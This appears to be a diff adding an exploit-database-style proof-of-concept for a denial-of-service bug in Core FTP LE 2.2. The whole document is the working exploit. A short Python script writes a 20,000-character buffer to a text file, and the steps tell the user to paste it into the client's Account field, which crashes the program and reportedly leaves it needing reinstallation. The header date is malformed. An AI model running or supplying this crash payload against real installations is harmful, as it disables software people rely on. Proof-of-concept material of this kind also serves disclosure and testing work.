@@ -1,0 +1,32 @@
+# Exploit Title: Core FTP LE 2.2 - Denial of Service (PoC)
+# Date: 2020-25-02
+# Exploit Author: Ismael Nava
+# Vendor Homepage: http://www.coreftp.com/
+# Software Link: http://www.coreftp.com/download.html
+# Version: 2.2 build 1947
+# Tested on: Windows 10 Home x64
+# CVE : n/a
+
+#STEPS
+# Open the program Core FTP LE
+# In File select the option Connect
+# Click in the option Advanced from the fiel Host / IP / URL
+# Run the python exploit script, it will create a new .txt files
+# Copy the content of the file "Dog.txt"
+# Paste the content in the field Account
+# Click in OK
+# After Core FTP lE closed, the program did not work again if the user try to
+# open again, so it is necessary uninstall and install again
+# End :)
+
+
+buffer = 'R' * 20000
+
+try: 
+    file = open("Dog.txt","w")
+    file.write(buffer)
+    file.close()
+
+    print("Archive ready")
+except:
+    print("Archive no ready")
